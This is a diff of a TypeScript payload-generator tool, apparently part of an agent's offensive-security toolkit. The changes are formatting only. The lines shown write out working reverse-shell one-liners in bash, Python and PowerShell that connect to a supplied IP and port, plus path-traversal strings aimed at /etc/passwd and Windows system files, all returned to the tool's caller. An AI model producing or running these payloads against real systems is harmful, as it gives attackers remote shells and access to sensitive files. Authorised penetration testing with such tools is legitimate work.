@@ -30,7 +30,7 @@ const PAYLOAD_TEMPLATES: Record<string, Record<string, string[]>> = {
   reverse_shell: {
     bash: ['bash -i >& /dev/tcp/{ip}/{port} 0>&1'],
     python: [
-      "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
     ],
     powershell: [
       "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"",
@@ -38,7 +38,10 @@ const PAYLOAD_TEMPLATES: Record<string, Record<string, string[]>> = {
   },
   path_traversal: {
     linux: ['../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd', '/etc/passwd%00'],
-    windows: ['..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', '..%5c..%5c..%5cwindows%5cwin.ini'],
+    windows: [
+      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+      '..%5c..%5c..%5cwindows%5cwin.ini',
+    ],
   },
 };
 
@@ -55,7 +58,11 @@ export class PayloadGeneratorTool extends BaseTool {
     const port = String(params.port ?? '4444');
 
     if (!type) {
-      return { success: false, result: null, error: `Missing parameter: type (${Object.keys(PAYLOAD_TEMPLATES).join(', ')})` };
+      return {
+        success: false,
+        result: null,
+        error: `Missing parameter: type (${Object.keys(PAYLOAD_TEMPLATES).join(', ')})`,
+      };
     }
     const bucket = PAYLOAD_TEMPLATES[type];
     if (!bucket) {
@@ -84,4 +91,3 @@ export class PayloadGeneratorTool extends BaseTool {
     };
   }
 }
-
